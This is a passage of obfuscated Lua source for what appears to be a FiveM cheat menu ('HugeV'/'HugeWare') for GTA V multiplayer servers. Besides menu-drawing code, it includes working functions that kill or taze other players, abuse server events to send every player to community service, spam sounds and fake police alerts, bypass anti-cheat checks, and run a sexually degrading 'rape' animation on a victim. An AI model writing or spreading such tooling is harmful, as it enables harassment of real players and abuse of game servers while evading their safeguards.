                        0xF75B0D629E1C063D,
                        Czitirzen_InvokeNative(0xD80958FC74E988A6),
                        vehicle_UDHUHDFSGDFG,
                        -1
                    )
                end
            else
                DebugPrint("Player must be in vehicle", "ERROR")
            end
        end
    )
end

local function KeyBoardInput_jdhgijslrgeg(TextEntry_dihg8e4w9gsdfg, ExampleText_dug8iew74gsd, MaxStringLength_dijgps9e8r)
    Czitirzen_InvokeNative(0x32CA01C3, "FMMC_KEY_TIP1", "~y~" .. TextEntry_dihg8e4w9gsdfg .. ":")
    Czitirzen_InvokeNative(
        0x00DC833F2568DBF6,
        1,
        "FMMC_KEY_TIP1",
        "",
        ExampleText_dug8iew74gsd,
        "",
        "",
        "",
        MaxStringLength_dijgps9e8r
    )
    blockinput_dihgs8ourigdfg = true

    while Czitirzen_InvokeNative(0x0CF2B696BBF945AE) ~= 1 and Czitirzen_InvokeNative(0x0CF2B696BBF945AE) ~= 2 do
        Wait(0)
    end

    if Czitirzen_InvokeNative(0x0CF2B696BBF945AE) ~= 2 then
        local dfjs8erfdfg = GetOnscreenKeyboardResult()
        Wait(500)
        blockinput_dihgs8ourigdfg = false
        return dfjs8erfdfg
    else
        Wait(500)
        blockinput_dihgs8ourigdfg = false
        return nil
    end
end

local function RGB_Rainbow_DSUGSIDGSD(frequency_DDUSHGIDS)
    local result_DSUGIISDG = {}
    local curtime_DSUIHGISDG = Czitirzen_InvokeNative(0x9CD27B0045628463) / 1000

    result_DSUGIISDG.r = math.floor(math.sin(curtime_DSUIHGISDG * frequency_DDUSHGIDS + 0) * 127 + 128)
    result_DSUGIISDG.g = math.floor(math.sin(curtime_DSUIHGISDG * frequency_DDUSHGIDS + 2) * 127 + 128)
    result_DSUGIISDG.b = math.floor(math.sin(curtime_DSUIHGISDG * frequency_DDUSHGIDS + 4) * 127 + 128)

    return result_DSUGIISDG
end

local function RequestModelSync_SDUFHSIDGSDG(model_DSIGHODSIGSD, timeout_DSIUFHISDGSDG)
    timeout_DSIUFHISDGSDG = timeout_DSIUFHISDGSDG or 2500
    local counter_DSGIHSDIUGJDSGDS = 0
    Czitirzen_InvokeNative(0x963D27A58DF860AC, Czitirzen_InvokeNative(0xD24D37CC275948CC, model_DSIGHODSIGSD))

    while not Czitirzen_InvokeNative(0x98A4EB5D89A0C952, Czitirzen_InvokeNative(0xD24D37CC275948CC, model_DSIGHODSIGSD)) do
        Czitirzen_InvokeNative(0x963D27A58DF860AC, model_DSIGHODSIGSD)
        counter_DSGIHSDIUGJDSGDS = counter_DSGIHSDIUGJDSGDS + 100
        Wait(0)
        if counter_DSGIHSDIUGJDSGDS >= timeout_DSIUFHISDGSDG then
            return false
        end
    end

    return true
end

local function ChangeModel_HugeWare_SDGISDGSD(model)
    local hash_SDGHISDGDS = Czitirzen_InvokeNative(0xD24D37CC275948CC, tostring(model))
    local player_SDIGJOSIDGSD = Czitirzen_InvokeNative(0x4F8644AF03D0E0D6)

    RequestModelSync_SDUFHSIDGSDG(tostring(model))

    Czitirzen_InvokeNative(0x00A1CADD00108836, player_SDIGJOSIDGSD, hash_SDGHISDGDS)
    Czitirzen_InvokeNative(0x262B14F48D29DE80, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), 0, 0, 0, 0)
    Czitirzen_InvokeNative(0xE532F5D78798DAAB, hash_SDGHISDGDS)
end

local texture_preload_DSGHDSIUGDSG = {
    "commonmenu",
    "mpleaderboard",
    "mphud",
    "helicopterhud",
    "mpweaponsgang1",
    "timerbars"
}

local function PreloadTextures_DSIGJSIUDGSDG()
    for PETLATYKURWOZONETAPAJEBANA = 1, #texture_preload_DSGHDSIUGDSG do
        Czitirzen_InvokeNative(0xDFA2EF8E04127DD5, texture_preload_DSGHDSIUGDSG[PETLATYKURWOZONETAPAJEBANA])
    end
end

PreloadTextures_DSIGJSIUDGSDG()

local guns_assets = {
    "WEAPON_RPG",
    "WEAPON_STUNGUN",
    "WEAPON_ASSAULTRIFLE",
    "WEAPON_FIREWORK"
}

local function PreloadGunsAssets()
    for i = 1, #guns_assets do
        RequestWeaponAsset(GetHashKey(guns_assets[i]))
    end
end

PreloadGunsAssets()

local function Enumerate(aH, aI, aJ)
    return coroutine.wrap(
        function()
            local aK, t = aH()

            if not t or t == 0 then
                aJ(aK)

                return
            end

            local aF = {
                handle = aK,
                destructor = aJ
            }

            setmetatable(aF, aE)
            local aL = true
            repeat
                coroutine.yield(t)
                aL, t = aI(aK)
            until not aL
            aF.destructor, aF.handle = nil, nil
            aJ(aK)
        end
    )
end

local function EnumerateVehicles()
    return Enumerate(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

local function EnumeratePeds()
    return Enumerate(FindFirstPed, FindNextPed, EndFindPed)
end

local function EnumerateObjects()
    return Enumerate(FindFirstObject, FindNextObject, EndFindObject)
end

local function DoNet_SDUHGSDIUSUDGYSUDIGSDG(obj)
    if not DoesEntityExist(obj) then
        return
    end
    local id = ObjToNet(obj)
    NetworkSetNetworkIdDynamic(id, true)
    SetNetworkIdExistsOnAllMachines(id, true)
    SetNetworkIdCanMigrate(id, false)

    for _, src in pairs(GetActivePlayers()) do
        SetNetworkIdSyncToPlayer(id, src, true)
    end
end

--------MENU---------
function text_szpachlan_szmata(
    nazwa_szpachlan_szmata,
    outline_szpachlan_szmata,
    size_szpachlan_szmata,
    Justification_szpachlan_szmata,
    x,
    y,
    czcionka,
    centre)
    if outline_szpachlan_szmata then
        SetTextOutline()
    end
    if czcionka ~= nil and tonumber(czcionka) ~= nil then
        SetTextFont(czcionka)
    else
        SetTextFont(0)
    end
    if centre then
        SetTextCentre(true)
    end
    SetTextProportional(1)
    SetTextScale(100.0, size_szpachlan_szmata)
    SetTextEdge(1, 0, 0, 0, 255)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(nazwa_szpachlan_szmata)
    EndTextCommandDisplayText(x, y)
end

function textik_notify(
    nazwa_szpachlan_szmata,
    outline_szpachlan_szmata,
    size_szpachlan_szmata,
    Justification_szpachlan_szmata,
    x,
    y,
    czcionka)
    if outline_szpachlan_szmata then
        SetTextOutline()
    end
    if czcionka ~= nil and tonumber(czcionka) ~= nil then
        SetTextFont(czcionka)
    else
        SetTextFont(2)
    end
    SetTextProportional(1)
    SetTextScale(100.0, size_szpachlan_szmata)
    SetTextEdge(1, 0, 0, 0, 255)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(nazwa_szpachlan_szmata)
    EndTextCommandDisplayText(x, y)
end

function onlineplayers_jgithjtrl(
    nazwa_szpachlan_szmata,
    outline_szpachlan_szmata,
    size_szpachlan_szmata,
    Justification_szpachlan_szmata,
    x,
    y,
    czcionka)
    if outline_szpachlan_szmata then
        SetTextOutline()
    end
    if czcionka ~= nil and tonumber(czcionka) ~= nil then
        SetTextFont(czcionka)
    else
        SetTextFont(4)
    end
    SetTextProportional(1)
    SetTextScale(100.0, size_szpachlan_szmata)
    SetTextEdge(1, 0, 0, 0, 255)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(nazwa_szpachlan_szmata)
    EndTextCommandDisplayText(x, y)
end

local function narysuj_celownik_xd_uhfaidsoulgdfsdfg(text_diuigsodgsdfg, x_disghp9eriuogsdfg, y_d8ygso9hgh9ewdfg)
    Czitirzen_InvokeNative(0x66E0276CC5F6B9DA, 0)
    Czitirzen_InvokeNative(0x038C1F517D7FDCF8, 1)
    Czitirzen_InvokeNative(0x07C837F9A01C34C9, 0.0, 0.4)
    Czitirzen_InvokeNative(0x465C84BC39F1C351, 1, 0, 0, 0, 255)
    Czitirzen_InvokeNative(0x441603240D202FA6, 1, 0, 0, 0, 255)
    Czitirzen_InvokeNative(0x1CA3E9EAC9D93E5E)
    Czitirzen_InvokeNative(0x2513DFB0FB8400FE)
    Czitirzen_InvokeNative(0x25FBB336DF1804CB, "STRING")
    Czitirzen_InvokeNative(0x94CF4AC034C9C986, text_diuigsodgsdfg)
    Czitirzen_InvokeNative(0xCD015E5BB0D96A57, x_disghp9eriuogsdfg, y_d8ygso9hgh9ewdfg)
end

local function GetTextWidht(str, font, scale)
    BeginTextCommandWidth("STRING")
    AddTextComponentSubstringPlayerName(str)
    SetTextFont(font or 4)
    SetTextScale(100.0, scale)
    local length = EndTextCommandGetWidth(1)

    return length
end

local function MenuButton_czlowiek_DS(nazwa_szpachlan_szmata, outline_szpachlan_szmata, x, y)
    local cursor_x, cursor_y = GetNuiCursorPosition()
    if string.lower(HugeV.locals.selected) == string.lower(nazwa_szpachlan_szmata) then
        DrawRect(
            x + 0.01485,
            y,
            0.068,
            0.0255,
            HugeV.menu_color.HugeWare_pw.r,
            HugeV.menu_color.HugeWare_pw.g,
            HugeV.menu_color.HugeWare_pw.b,
            120
        )
        text_szpachlan_szmata("~b~" .. nazwa_szpachlan_szmata, outline_szpachlan_szmata, 0.3, 0, x, y - 0.009, 4)
    elseif string.lower(HugeV.locals.selected2) == string.lower(nazwa_szpachlan_szmata) then
        text_szpachlan_szmata("~b~" .. nazwa_szpachlan_szmata, outline_szpachlan_szmata, 0.3, 0, x, y - 0.009, 4)
    else
        text_szpachlan_szmata(nazwa_szpachlan_szmata, outline_szpachlan_szmata, 0.3, 0, x, y - 0.009, 4)
    end
    x = x + 0.015
    --DrawRect(x,y,0.065,0.035,213, 52, 235,255)
    local cursor_x, cursor_y = GetNuiCursorPosition()
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    if
        ((cursor_x) + 0.03 >= x and (cursor_x) - 0.03 <= x and (cursor_y) + 0.012 >= y and (cursor_y) - 0.012 <= y and
            IsDisabledControlJustReleased(0, 92))
     then
        return true
    else
        return false
    end
end

local function MenuButton_czlowiek_DS_2(nazwa_szpachlan_szmata, outline_szpachlan_szmata, x, y)
    local cursor_x, cursor_y = GetNuiCursorPosition()
    if string.lower(HugeV.locals.selected) == string.lower(nazwa_szpachlan_szmata) then
        text_szpachlan_szmata("~b~" .. nazwa_szpachlan_szmata, outline_szpachlan_szmata, 0.3, 0, x, y - 0.009, 4)
    elseif string.lower(HugeV.locals.selected2) == string.lower(nazwa_szpachlan_szmata) then
        text_szpachlan_szmata("~b~" .. nazwa_szpachlan_szmata, outline_szpachlan_szmata, 0.3, 0, x, y - 0.009, 4)
    else
        text_szpachlan_szmata(nazwa_szpachlan_szmata, outline_szpachlan_szmata, 0.3, 0, x, y - 0.009, 4)
    end
    --DrawRect(x,y,0.065,0.035,213, 52, 235,255)
    local cursor_x, cursor_y = GetNuiCursorPosition()
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    if
        ((cursor_x) + 0.001 >= x and (cursor_x) - 0.02 <= x and (cursor_y) + 0.011 >= y and (cursor_y) - 0.01 <= y and
            IsDisabledControlJustReleased(0, 92))
     then
        return true
    else
        return false
    end
end

function SlimButton_antekr5(nazwa_szpachlan_szmata, outline_szpachlan_szmata, x, y)
    local cursor_x, cursor_y = GetNuiCursorPosition()
    text_szpachlan_szmata(nazwa_szpachlan_szmata, outline_szpachlan_szmata, 0.25, 0, x, y - 0.009, 2)
    --DrawRect(x,y,0.048,0.028,15,15,15,255)
    local cursor_x, cursor_y = GetNuiCursorPosition()
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    local widht = GetTextWidht(nazwa_szpachlan_szmata, 2, 0.25)
    if
        ((cursor_x) + 0.025 >= x and (cursor_x) - (widht) <= x and (cursor_y) + 0.013 >= y and (cursor_y) - 0.012 <= y and
            IsDisabledControlJustReleased(0, 92))
     then
        return true
    else
        return false
    end
end

function BindButton_DSGUHSDIGHSDU(nazwa_szpachlan_szmata, outline_szpachlan_szmata, x, y)
    text_szpachlan_szmata(nazwa_szpachlan_szmata, outline_szpachlan_szmata, 0.23, 0, x, y - 0.009)
    --DrawRect(x,y,0.048,0.028,15,15,15,255)
    local cursor_x, cursor_y = GetNuiCursorPosition()
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    if
        ((cursor_x) + 0.053 >= x and (cursor_x) - 0.069 <= x and (cursor_y) + 0.013 >= y and (cursor_y) - 0.012 <= y and
            IsDisabledControlJustReleased(0, 92))
     then
        return true
    else
        return false
    end
end

function Bones_Button(bool, nazwa_szpachlan_szmata, outline_szpachlan_szmata, x, y)
    text_szpachlan_szmata(nazwa_szpachlan_szmata, outline_szpachlan_szmata, 0.3, 0, x - 0.025, y - 0.01, 2)
    if bool then
        DrawRect(x, y, 0.053, 0.02, 29, 17, 133, 255)
    else
        DrawRect(x, y, 0.053, 0.02, 0, 0, 0, 255)
    end

    local cursor_x, cursor_y = GetNuiCursorPosition()
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    if
        ((cursor_x) + 0.025 >= x and (cursor_x) - 0.024 <= x and (cursor_y) + 0.01 >= y and (cursor_y) - 0.012 <= y and
            IsDisabledControlJustReleased(0, 92))
     then
        return true
    else
        return false
    end
end

function OnlineButton(id, nazwa_szpachlan_szmata, outline_szpachlan_szmata, x, y)
    if HugeV.string.len(nazwa_szpachlan_szmata) >= 36 then
        nazwa_szpachlan_szmata = string.sub(nazwa_szpachlan_szmata, 1, 33) .. "..."
    end
    text_szpachlan_szmata(
        nazwa_szpachlan_szmata .. " [" .. id .. "]",
        outline_szpachlan_szmata,
        0.3,
        0,
        x - 0.044,
        y - 0.01,
        4
    )
    if nazwa_szpachlan_szmata == GetPlayerName(HugeV.locals.SelectedPlayer) then
        DrawRect(x + 0.02, y, 0.13, 0.017, 29, 17, 133, 255)
    else
        DrawRect(x + 0.02, y, 0.13, 0.017, 0, 0, 0, 255)
    end

    local cursor_x, cursor_y = GetNuiCursorPosition()
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    if
        ((cursor_x) + 0.045 >= x and (cursor_x) - 0.075 <= x and (cursor_y) + 0.01 >= y and (cursor_y) - 0.012 <= y and
            IsDisabledControlJustReleased(0, 92))
     then
        return true
    else
        return false
    end
end

function VehicleButton(id, nazwa_szpachlan_szmata, outline_szpachlan_szmata, x, y, model)
    if HugeV.string.len(nazwa_szpachlan_szmata) >= 36 then
        nazwa_szpachlan_szmata = string.sub(nazwa_szpachlan_szmata, 1, 33) .. "..."
    end
    local cursor_x, cursor_y = GetNuiCursorPosition()
    if id then
        text_szpachlan_szmata(
            string.upper(nazwa_szpachlan_szmata) .. " [" .. id .. "]",
            outline_szpachlan_szmata,
            0.3,
            0,
            x - 0.044,
            y - 0.01,
            4
        )
    else
        text_szpachlan_szmata(
            string.upper(nazwa_szpachlan_szmata) .. " [Not found]",
            outline_szpachlan_szmata,
            0.3,
            0,
            x - 0.044,
            y - 0.01,
            4
        )
    end
    if model == HugeV.locals.SelectedVehicle then
        DrawRect(x + 0.02, y, 0.13, 0.017, 29, 17, 133, 255)
    else
        DrawRect(x + 0.02, y, 0.13, 0.017, 0, 0, 0, 255)
    end

    local cursor_x, cursor_y = GetNuiCursorPosition()
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    if
        ((cursor_x) + 0.045 >= x and (cursor_x) - 0.075 <= x and (cursor_y) + 0.01 >= y and (cursor_y) - 0.012 <= y and
            IsDisabledControlJustReleased(0, 92))
     then
        return true
    else
        return false
    end
end

local DSUFYSIDUGYSUDYSIDGSDG = {}
local DSUIGYDSIUGYUDSIGSDG =
    Czitirzen_InvokeNative(0xF1307EF624A80D87, true, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
local AYSTRYATUFYSDFSDG = 10 ^ 3

local function DrawSprite_HugeWare_SDGUHSFDIGDFG(
    textureDict_SDGHSIUDGSDG,
    textureName_DSGUHSDUGHIUDS,
    screenX_DSGUHSDUIGSDG,
    screenY_SDGHDSIGSDG,
    width_SDIGHSUIDGSDG,
    height_SDGHDSIUGSDG,
    heading,
    red,
    green,
    blue,
    alpha)
    local index_DSGUHISUDGSD = tostring(textureName_DSGUHSDUGHIUDS)

    if not DSUFYSIDUGYSUDYSIDGSDG[index_DSGUHISUDGSD] then
        DSUFYSIDUGYSUDYSIDGSDG[index_DSGUHISUDGSD] = {}
        local res_DSUGHSDIUGSDG =
            Czitirzen_InvokeNative(
            0x35736EE65BD00C11,
            textureDict_SDGHSIUDGSDG,
            textureName_DSGUHSDUGHIUDS,
            Citizen.ReturnResultAnyway(),
            Citizen.ResultAsVector()
        )

        DSUFYSIDUGYSUDYSIDGSDG[index_DSGUHISUDGSD].DSUIGYDSIUGYUDSIGSDG = (res_DSUGHSDIUGSDG[2] / res_DSUGHSDIUGSDG[1])
        DSUFYSIDUGYSUDYSIDGSDG[index_DSGUHISUDGSD].height_SDGHDSIUGSDG =
            math.floor(
            ((width_SDIGHSUIDGSDG * DSUFYSIDUGYSUDYSIDGSDG[index_DSGUHISUDGSD].DSUIGYDSIUGYUDSIGSDG) *
                DSUIGYDSIUGYUDSIGSDG) *
                AYSTRYATUFYSDFSDG +
                0.5
        ) / AYSTRYATUFYSDFSDG
        Czitirzen_InvokeNative(
            0xE7FFAE5EBF23D890,
            textureDict_SDGHSIUDGSDG,
            textureName_DSGUHSDUGHIUDS,
            screenX_DSGUHSDUIGSDG,
            screenY_SDGHDSIGSDG,
            width_SDIGHSUIDGSDG,
            DSUFYSIDUGYSUDYSIDGSDG[index_DSGUHISUDGSD].height_SDGHDSIUGSDG,
            heading,
            red,
            green,
            blue,
            alpha
        )
    end

    Czitirzen_InvokeNative(
        0xE7FFAE5EBF23D890,
        textureDict_SDGHSIUDGSDG,
        textureName_DSGUHSDUGHIUDS,
        screenX_DSGUHSDUIGSDG,
        screenY_SDGHDSIGSDG,
        width_SDIGHSUIDGSDG,
        DSUFYSIDUGYSUDYSIDGSDG[index_DSGUHISUDGSD].height_SDGHDSIUGSDG,
        heading,
        red,
        green,
        blue,
        alpha
    )
end

local function SlimCheckbox(nazwa, x, y, y2, bool)
    local buttonSpriteScale_DSGJHSDIGSDG = {x = 0.016, y = 0.1}
    local cursor_x, cursor_y = GetNuiCursorPosition()
    local x_res, y_res = GetActiveScreenResolution()
    local x2 = x - 0.005
    if bool then
        DrawRect(
            x2,
            y2,
            0.007,
            0.012,
            HugeV.menu_color.HugeWare_pw.r,
            HugeV.menu_color.HugeWare_pw.g,
            HugeV.menu_color.HugeWare_pw.b,
            255
        )
        DrawSprite_HugeWare_SDGUHSFDIGDFG(
            "mpleaderboard",
            "leaderboard_voteblank_icon",
            x2,
            y2,
            buttonSpriteScale_DSGJHSDIGSDG.x,
            buttonSpriteScale_DSGJHSDIGSDG.y,
            0.0,
            13,
            10,
            39,
            255
        )
        DrawSprite("commonmenu", "shop_tick_icon", x2, y2, 0.01, 0.017, 0.0, 255, 255, 255, 255)
    else
        DrawRect(
            x2,
            y2,
            0.007,
            0.012,
            HugeV.menu_color.HugeWare_pw.r,
            HugeV.menu_color.HugeWare_pw.g,
            HugeV.menu_color.HugeWare_pw.b,
            255
        )
        DrawSprite_HugeWare_SDGUHSFDIGDFG(
            "mpleaderboard",
            "leaderboard_voteblank_icon",
            x2,
            y2,
            buttonSpriteScale_DSGJHSDIGSDG.x,
            buttonSpriteScale_DSGJHSDIGSDG.y,
            0.0,
            13,
            10,
            39,
            255
        )
    end
    text_szpachlan_szmata(nazwa, false, 0.25, 0, x, y - 0.009, 2)

    local cursor_x, cursor_y = GetNuiCursorPosition()
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    local widht = GetTextWidht(nazwa, 4, 0.25)
    if
        ((cursor_x) + 0.030 >= x and (cursor_x) - (widht * 1.2) <= x and (cursor_y) + 0.009 >= y and
            (cursor_y) - 0.01 <= y and
            IsDisabledControlJustReleased(0, 92))
     then
        return true
    else
        return false
    end
end

--

function bar_antekr5(x, y, height_antekr5)
    DrawRect(x, y, 0.003, height_antekr5, 161, 161, 161, 255)
end
-----MENU-----

---------FUNCTIONS----------

local function TazePlayer_GUI_HugeV(player_HGUTJHKRHNRTRTJT)
    local ped_gjerihjetrihjrtijhirt = Czitirzen_InvokeNative(0x43A66C31C68491C0, player_HGUTJHKRHNRTRTJT)
    local Coords_hgjeihjtrihrtk = HugeV.functions.getEntityCoords(ped_gjerihjetrihjrtijhirt)

    local destiporeohgekhlertjkhe = GetPedBoneCoords(ped_gjerihjetrihjrtijhirt, 0, 0.0, 0.0, 0.0)
    local gerjihjtreihjrthrlthr = GetPedBoneCoords(ped_gjerihjetrihjrtijhirt, 57005, 0.0, 0.0, 0.2)

    Czitirzen_InvokeNative(
        0x867654CBC7606F2C,
        gerjihjtreihjrthrlthr,
        destiporeohgekhlertjkhe,
        1,
        true,
        GetHashKey("WEAPON_STUNGUN"),
        Czitirzen_InvokeNative(0xD80958FC74E988A6),
        true,
        false,
        1.0
    )
end

local function KillPlayer(player_HGUTJHKRHNRTRTJT)
    local ped_gjerihjetrihjrtijhirt = Czitirzen_InvokeNative(0x43A66C31C68491C0, player_HGUTJHKRHNRTRTJT)
    local Coords_hgjeihjtrihrtk = HugeV.functions.getEntityCoords(ped_gjerihjetrihjrtijhirt)

    local destiporeohgekhlertjkhe = GetPedBoneCoords(ped_gjerihjetrihjrtijhirt, 0, 0.0, 0.0, 0.0)
    local gerjihjtreihjrthrlthr = GetPedBoneCoords(ped_gjerihjetrihjrtijhirt, 57005, 0.0, 0.0, 0.2)

    if HugeV.locals.peds[1] == HugeV.Player.PedId then
        Czitirzen_InvokeNative(
            0x867654CBC7606F2C,
            gerjihjtreihjrthrlthr,
            destiporeohgekhlertjkhe,
            1.0,
            true,
            GetHashKey("WEAPON_STUNGUN"),
            HugeV.locals.peds[2],
            true,
            false,
            1.0
        )
    else
        Czitirzen_InvokeNative(
            0x867654CBC7606F2C,
            gerjihjtreihjrthrlthr,
            destiporeohgekhlertjkhe,
            1.0,
            true,
            GetHashKey("WEAPON_STUNGUN"),
            HugeV.locals.peds[1],
            true,
            false,
            1.0
        )
    end
end

local function GetSeatPedIsIn_Czlowiek_KOZACZEK(ped_Czlowiek_KOZACZEK)
    if not IsPedInAnyVehicle(ped_Czlowiek_KOZACZEK, false) then
        return
    else
        veh_Czlowiek_KOZACZEK = GetVehiclePedIsIn(ped_Czlowiek_KOZACZEK)
        for PETLATYKURWOZONETAPAJEBANA = 0, GetVehicleMaxNumberOfPassengers(veh_Czlowiek_KOZACZEK) do
            if GetPedInVehicleSeat(veh_Czlowiek_KOZACZEK) then
                return PETLATYKURWOZONETAPAJEBANA
            end
        end
    end
end

function RequestControlOnce_chuj_dupa_cipa(entity_Czlowiek_KOZACZEK)
    if not NetworkIsInSession() or NetworkHasControlOfEntity(entity_Czlowiek_KOZACZEK) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity_Czlowiek_KOZACZEK), true)
    return NetworkRequestControlOfEntity(entity_Czlowiek_KOZACZEK)
end

function GetCamDirection_Czlowiek_KOZACZEK()
    local heading_Czlowiek_KOZACZEK = GetGameplayCamRelativeHeading() + GetEntityHeading(HugeV.Player.PedId)
    local pitch_Czlowiek_KOZACZEK = GetGameplayCamRelativePitch()

    local x = -math.sin(heading_Czlowiek_KOZACZEK * math.pi / 180.0)
    local y = math.cos(heading_Czlowiek_KOZACZEK * math.pi / 180.0)
    local z = math.sin(pitch_Czlowiek_KOZACZEK * math.pi / 180.0)

    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end

    return x, y, z
end

function TSE_API_AC_SHIT(is_server_API_AC_SHIT, event_API_AC_SHIT, ...)
    local args_API_AC_SHIT = msgpack.pack({...})
    if is_server_API_AC_SHIT then
        TriggerServerEventInternal(event_API_AC_SHIT, args_API_AC_SHIT)
    else
        TriggerEventInternal(event_API_AC_SHIT, args_API_AC_SHIT)
    end
end

function math.round(first_API, second_API)
    return tonumber(string.format("%." .. (second_API or 0) .. "f", first_API))
end

function respawnPed_API(id_API, cords_API, int_API)
    SetEntityCoordsNoOffset(id_API, cords_API.x, cords_API.y, cords_API.z, false, false, false, true)
    NetworkResurrectLocalPlayer(cords_API.x, cords_API.y, cords_API.z, int_API, true, false)
    SetPlayerInvincible(id_API, false)
    TSE_API_AC_SHIT(false, "playerSpawned", cords_API.x, cords_API.y, cords_API.z)
    ClearPedBloodDamage(id_API)
end

function nativeRevive_API()
    local entcord_API = HugeV.functions.getEntityCoords(HugeV.Player.PedId)
    local cords_API = {
        x = math.round(entcord_API.x, 1),
        y = math.round(entcord_API.y, 1),
        z = math.round(entcord_API.z, 1)
    }
    respawnPed_API(HugeV.Player.PedId, cords_API, 0)
    StopScreenEffect("DeathFailOut")
end

function GetPlayers_api()
    local players_api = {}

    for _, player_api in ipairs(GetActivePlayers()) do
        local ped = GetPlayerPed(player_api)

        if DoesEntityExist(ped) then
            table.insert(players_api, player_api)
        end
    end

    return players_api
end

--tutaj anitaim
local function IntToFloat_NUGTHBGNURTHNHTR(int_DSIGISDG)
    if int_DSIGISDG then
        local float_DSGJISDGSD = int_DSIGISDG + 0.0
        return float_DSGJISDGSD
    else
        return nil
    end
end

local function CommunityService_2_HUGEV(butkukybyukbuy)
    TriggerServerEvent("esx_communityservice:sendToCommunityService", butkukybyukbuy, 5391)
end

local function CommunityService_1_HUGEV()
    for i_DSDSGUSHDIUGSD = 0, 128 do
        CommunityService_2_HUGEV(GetPlayerServerId(i_DSDSGUSHDIUGSD))
    end
end

local function EarRape_InteractSoud_BGUTRBHUTRHNKRTUJH()
    TriggerServerEvent("InteractSound_SV:PlayOnAll", "demo", 99.0)
    TriggerServerEvent("InteractSound_SV:PlayOnAll", "cuff", 97.0)
    TriggerServerEvent("InteractSound_SV:PlayOnAll", "buckle", 96.0)
end

local function Police_SPAM_JJTYJTJYTJ()
    TriggerServerEvent("esx_outlawalert:gunshotInProgress", {x = 1337, y = 1337, z = 1337}, "HugeV Menu ;)", 0)
end

local function DeleteEntity(entity)
    if not DoesEntityExist(entity) then
        return
    end
    NetworkRequestControlOfEntity(entity)
    SetEntityAsMissionEntity(entity, true, true)
    DeletePed(entity)
    DeleteEntity(entity)
    DeleteObject(entity)
    DeleteVehicle(entity)
end

--gowno

function bind()
    local klikniete = nil
    local napis = nil
    local zbindowane = false
    while not zbindowane do
        Citizen.Wait(1)
        DrawRect(0.5, 0.5, 0.25, 0.3, 13, 10, 39, 255)
        text_szpachlan_szmata("Press any button you want.", false, 0.35, 0, 0.425, 0.48)
        for k, v in pairs(HugeV.locals.keys) do
            if IsDisabledControlPressed(0, v) then
                klikniete = v
                napis = k
            end
        end
        if klikniete ~= nil then
            zbindowane = true
            return klikniete, napis
        end
    end
end

---------FUNCTIONS----------

function kontrols_asd(Disable_asfgw)
    Czitirzen_InvokeNative(0xAAE7CE1D63167423)
    DisableControlAction(0, 1, true) -- LookLeftRight
    DisableControlAction(0, 2, true) -- LookUpDown
    DisableControlAction(0, 142, true) -- MeleeAttackAlternate
    DisableControlAction(0, 18, true) -- Enter
    DisableControlAction(0, 322, true) -- ESC
    DisableControlAction(0, 106, true) -- VehicleMouseControlOverride
    DisableControlAction(0, 24, true)
    DisableControlAction(0, 257, true)
    DisableControlAction(0, 25, true)

    if not HugeV.locals.can_walk_with_menu then
        DisableControlAction(0, 32, true) -- W
        DisableControlAction(0, 31, true) -- S
        DisableControlAction(0, 30, true) -- D
        DisableControlAction(0, 34, true) -- A
    end
end

local function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

function rape(player)
    Citizen.CreateThread(
        function()
            RequestModelSync_SDUFHSIDGSDG("a_m_o_acult_01")
            RequestAnimDict("rcmpaparazzo_2")
            while not HasAnimDictLoaded("rcmpaparazzo_2") do
                Citizen.Wait(0)
            end

            if IsPedInAnyVehicle(GetPlayerPed(player), true) then
                local veh = GetVehiclePedIsIn(GetPlayerPed(player), true)

                while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                end

                SetEntityAsMissionEntity(veh, true, true)
                DeleteVehicle(veh)
                DeleteEntity(veh)
            end
            count = -0.2
            for b = 1, 3 do
                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(player), true))
                local bD = CreatePed(4, GetHashKey("a_m_o_acult_01"), x, y, z, 0.0, true, false)
                SetEntityAsMissionEntity(bD, true, true)
                AttachEntityToEntity(
                    bD,
                    GetPlayerPed(player),
                    4103,
                    11816,
                    count,
                    0.00,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    false,
                    false,
                    false,
                    2,
                    true
                )
                ClearPedTasks(GetPlayerPed(player))
                TaskPlayAnim(GetPlayerPed(player), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetPedKeepTask(bD)
                TaskPlayAnim(bD, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetEntityInvincible(bD, true)
                count = count - 0.4
            end
        end
    )
end

function DelVeh(veh)
    SetEntityAsMissionEntity(veh, 1, 1)
    DeleteEntity(veh)
end

local function full_tuning_dugisdgdsfgidf(vehicle_dugsdifg)
    Czitirzen_InvokeNative(0x1F2AA07F00B3217A, vehicle_dugsdifg, 0)
    Czitirzen_InvokeNative(0x487EB21CC7295BA1, vehicle_dugsdifg, 7)
